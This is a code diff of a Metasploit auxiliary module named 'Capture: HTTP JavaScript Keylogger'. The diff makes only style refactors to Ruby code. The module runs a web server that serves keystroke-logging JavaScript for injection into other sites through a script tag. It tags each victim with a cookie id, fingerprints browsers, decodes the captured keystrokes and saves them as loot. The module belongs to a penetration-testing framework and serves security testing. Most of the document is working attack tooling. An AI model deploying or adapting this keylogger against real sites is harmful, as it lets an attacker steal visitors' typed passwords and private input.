@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,33 +7,31 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpServer::HTML
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'			=> 'Capture: HTTP JavaScript Keylogger',
-      'Description'	=> %q{
-          This modules runs a web server that demonstrates keystroke
-        logging through JavaScript. The DEMO option can be set to enable
-        a page that demonstrates this technique. Future improvements will
-        allow for a configurable template to be used with this module.
-        To use this module with an existing web page, simply add a
-        script source tag pointing to the URL of this service ending
-        in the .js extension. For example, if URIPATH is set to "test",
-        the following URL will load this script into the calling site:
-        http://server:port/test/anything.js
-      },
-      'License'	=> MSF_LICENSE,
-      'Author'	=> ['Marcus J. Carey <mjc[at]threatagent.com>', 'hdm']
-  ))
+                      'Name'			=> 'Capture: HTTP JavaScript Keylogger',
+                      'Description'	=> %q(
+                          This modules runs a web server that demonstrates keystroke
+                        logging through JavaScript. The DEMO option can be set to enable
+                        a page that demonstrates this technique. Future improvements will
+                        allow for a configurable template to be used with this module.
+                        To use this module with an existing web page, simply add a
+                        script source tag pointing to the URL of this service ending
+                        in the .js extension. For example, if URIPATH is set to "test",
+                        the following URL will load this script into the calling site:
+                        http://server:port/test/anything.js
+                      ),
+                      'License'	=> MSF_LICENSE,
+                      'Author'	=> ['Marcus J. Carey <mjc[at]threatagent.com>', 'hdm']))
 
-  register_options(
-    [
-      OptBool.new('DEMO', [true, "Creates HTML for demo purposes", false]),
-    ], self.class)
+    register_options(
+      [
+        OptBool.new('DEMO', [true, "Creates HTML for demo purposes", false])
+      ], self.class
+    )
   end
-
 
   # This is the module's main runtime method
   def run
@@ -46,21 +45,18 @@ class MetasploitModule < Msf::Auxiliary
 
   # This handles the HTTP responses for the Web server
   def on_request_uri(cli, request)
-
     cid = nil
 
-    if request['Cookie'].to_s =~ /,?\s*id=([a-f0-9]{4,32})/i
-      cid = $1
-    end
+    cid = Regexp.last_match(1) if request['Cookie'].to_s =~ /,?\s*id=([a-f0-9]{4,32})/i
 
-    if not cid and request.qstring['id'].to_s =~ /^([a-f0-9]{4,32})/i
-      cid = $1
+    if !cid && request.qstring['id'].to_s =~ /^([a-f0-9]{4,32})/i
+      cid = Regexp.last_match(1)
     end
 
     data = request.qstring['data']
 
     unless cid
-      cid = generate_client_id(cli,request)
+      cid = generate_client_id(cli, request)
       print_status("Assigning client identifier '#{cid}'")
 
       resp = create_response(302, 'Moved')
@@ -73,17 +69,17 @@ class MetasploitModule < Msf::Auxiliary
 
     base_url = generate_base_url(cli, request)
 
-    #print_status("#{cli.peerhost} [#{cid}] Incoming #{request.method} request for #{request.uri}")
+    # print_status("#{cli.peerhost} [#{cid}] Incoming #{request.method} request for #{request.uri}")
 
     case request.uri
     when /\.js(\?|$)/
       content_type = "text/plain"
-      send_response(cli, generate_keylogger_js(base_url, cid), {'Content-Type'=> content_type, 'Set-Cookie' => "id=#{cid}"})
+      send_response(cli, generate_keylogger_js(base_url, cid), 'Content-Type' => content_type, 'Set-Cookie' => "id=#{cid}")
 
     when /\/demo\/?(\?|$)/
       if datastore['DEMO']
         content_type = "text/html"
-        send_response(cli, generate_demo(base_url, cid), {'Content-Type'=> content_type, 'Set-Cookie' => "id=#{cid}"})
+        send_response(cli, generate_demo(base_url, cid), 'Content-Type' => content_type, 'Set-Cookie' => "id=#{cid}")
       else
         send_not_found(cli)
       end
@@ -92,7 +88,7 @@ class MetasploitModule < Msf::Auxiliary
       if data
         nice = process_data(cli, request, cid, data)
         script = datastore['DEMO'] ? generate_demo_js_reply(base_url, cid, nice) : ""
-        send_response(cli, script, {'Content-Type' => "text/plain", 'Set-Cookie' => "id=#{cid}"})
+        send_response(cli, script, 'Content-Type' => "text/plain", 'Set-Cookie' => "id=#{cid}")
       else
         if datastore['DEMO']
           send_redirect(cli, "/demo/?cid=#{cid}")
@@ -114,7 +110,7 @@ class MetasploitModule < Msf::Auxiliary
       bits = host.split(':')
 
       # Extract the hostname:port sequence from the Host header
-      if bits.length > 1 and bits.last.to_i > 0
+      if bits.length > 1 && bits.last.to_i > 0
         port = bits.pop.to_i
         host = bits.join(':')
       end
@@ -122,13 +118,11 @@ class MetasploitModule < Msf::Auxiliary
       port = datastore['SRVPORT'].to_i
     end
 
-    prot = (!! datastore['SSL']) ? 'https://' : 'http://'
-    if Rex::Socket.is_ipv6?(host)
-      host = "[#{host}]"
-    end
+    prot = !!datastore['SSL'] ? 'https://' : 'http://'
+    host = "[#{host}]" if Rex::Socket.is_ipv6?(host)
 
     base = prot + host
-    if not ((prot == 'https' and port.nil?) or (prot == 'http' and port.nil?))
+    unless ((prot == 'https') && port.nil?) || ((prot == 'http') && port.nil?)
       base << ":#{port}"
     end
 
@@ -136,7 +130,6 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def process_data(cli, request, cid, data)
-
     lines = [""]
     real  = ""
 
@@ -147,7 +140,7 @@ class MetasploitModule < Msf::Auxiliary
       case char.to_i
       # Do Backspace
       when 8
-        lines[-1] = lines[-1][0, lines[-1].length - 1] if lines[-1].length > 0
+        lines[-1] = lines[-1][0, lines[-1].length - 1] unless lines[-1].empty?
       when 13
         lines << ""
       else
@@ -158,12 +151,12 @@ class MetasploitModule < Msf::Auxiliary
     nice = lines.join("<CR>").gsub("\t", "<TAB>")
     real = real.gsub("\x08", "<DEL>")
 
-    if not @client_cache[cid]
+    unless @client_cache[cid]
 
       fp = fingerprint_user_agent(request['User-Agent'] || "")
-      header  = "Browser Keystroke Log\n"
+      header = "Browser Keystroke Log\n"
       header << "=====================\n"
-      header << "Created: #{Time.now.to_s}\n"
+      header << "Created: #{Time.now}\n"
       header << "Address: #{cli.peerhost}\n"
       header << "     ID: #{cid}\n"
       header << " FPrint: #{fp.inspect}\n"
@@ -172,28 +165,25 @@ class MetasploitModule < Msf::Auxiliary
       header << "====================\n\n"
 
       @client_cache[cid] = {
-        :created => Time.now.to_i,
-        :path_clean => store_loot("browser.keystrokes.clean", "text/plain", cli.peerhost, header, "keystrokes_clean_#{cid}.txt", "Browser Keystroke Logs (Clean)"),
-        :path_raw   => store_loot("browser.keystrokes.raw", "text/plain", cli.peerhost, header, "keystrokes_clean_#{cid}.txt", "Browser Keystroke Logs (Raw)")
+        created: Time.now.to_i,
+        path_clean: store_loot("browser.keystrokes.clean", "text/plain", cli.peerhost, header, "keystrokes_clean_#{cid}.txt", "Browser Keystroke Logs (Clean)"),
+        path_raw: store_loot("browser.keystrokes.raw", "text/plain", cli.peerhost, header, "keystrokes_clean_#{cid}.txt", "Browser Keystroke Logs (Raw)")
       }
       print_good("[#{cid}] Logging clean keystrokes to: #{@client_cache[cid][:path_clean]}")
       print_good("[#{cid}] Logging raw keystrokes to: #{@client_cache[cid][:path_raw]}")
     end
 
-    ::File.open( @client_cache[cid][:path_clean], "ab") { |fd| fd.puts nice }
-    ::File.open( @client_cache[cid][:path_raw], "ab")   { |fd| fd.write(real) }
+    ::File.open(@client_cache[cid][:path_clean], "ab") { |fd| fd.puts nice }
+    ::File.open(@client_cache[cid][:path_raw], "ab")   { |fd| fd.write(real) }
 
-    if nice.length > 0
-      print_good("[#{cid}] Keys: #{nice}")
-    end
+    print_good("[#{cid}] Keys: #{nice}") unless nice.empty?
 
     nice
   end
 
-  def generate_client_id(cli, req)
+  def generate_client_id(_cli, _req)
     "%.8x" % Kernel.rand(0x100000000)
   end
-
 
   def generate_demo(base_url, cid)
     # This is the Demo Form Page <HTML>
@@ -224,12 +214,11 @@ class MetasploitModule < Msf::Auxiliary
 </body>
 </html>
 EOS
-    return html
+    html
   end
 
   # This is the JavaScript Key Logger Code
   def generate_keylogger_js(base_url, cid)
-
     targ = Rex::Text.rand_text_alpha(12)
 
     code = <<EOS
@@ -291,16 +280,15 @@ function #{@seed}(k#{@seed}){
   setTimeout('document.body.removeChild(document.getElementById("' + t#{@seed} + '"))', 5000);
 }
 EOS
-    return code
+    code
   end
 
-  def generate_demo_js_reply(base_url, cid, data)
+  def generate_demo_js_reply(_base_url, _cid, data)
     code = <<EOS
       try {
         document.getElementById("results").value = "Keystrokes: #{data}";
       } catch(e) { }
 EOS
-    return code
+    code
   end
-
 end
